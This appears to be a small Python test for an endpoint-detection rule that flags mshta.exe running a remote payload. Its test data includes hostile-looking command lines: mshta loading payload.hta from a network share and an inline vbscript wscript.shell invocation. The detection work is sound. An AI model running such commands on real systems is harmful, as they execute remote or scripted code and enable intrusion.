from app.detect.rules import SUSPICIOUS_CMDLINE_PATTERNS
tests = [
    (r'"c:\windows\system32\mshta.exe" \10.0.0.5\share\payload.hta', True),
    (r'mshta.exe c:\local\thing.hta', False),
    (r'mshta.exe vbscript:close(createobject("wscript.shell").run("calc"))', False),
]
for t, expect_remote in tests:
    hits = [d for rx, _, d, _ in SUSPICIOUS_CMDLINE_PATTERNS if rx.search(t.lower())]
    got = 'Mshta remote payload execution' in hits
    print('PASS' if got == expect_remote else 'FAIL', repr(t), '->', hits)
